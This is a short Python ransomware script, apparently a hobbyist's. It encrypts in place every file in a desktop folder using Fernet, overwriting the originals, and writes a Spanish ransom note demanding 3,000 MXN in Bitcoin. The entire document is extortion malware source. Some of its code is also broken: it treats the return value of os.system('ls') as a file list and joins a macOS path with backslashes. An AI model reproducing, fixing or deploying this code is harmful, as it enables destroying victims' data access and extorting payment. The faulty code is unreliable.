from cryptography.fernet import Fernet
import os

def generar_key():
    key = Fernet.generate_key()
    with open('key.key', 'wb') as key_file: 
        key_file.write(key)

def cargar_key():
    return open('key.key', 'rb').read()

def encrypt(items, key): 
    f = Fernet(key)
    for item in items:
        with open(item, 'rb') as file:
            file_data = file.read()
        encrypted_data = f.encrypt(file_data)
        with open(item, 'wb') as file:
            file.write(encrypted_data)

if __name__ == '__main__':
    path_to_encrypt = '/Users/edwinrodriguez/Desktop/Archivos'
    
    items = os.system("ls")
    ls = [path_to_encrypt+'\\'+item for item in items]

    generar_key()
    key = cargar_key()

    encrypt(ls, key)

    with open(path_to_encrypt+'\\'+'readme.txt', 'w') as file: 
        file.write('Archivos encriptados por Edwin')
        file.write('Para recuperar tus arhivos deberas de pagarme $3,000 MXN en criptomonedas a esta wallet 345654 por Bitcoin')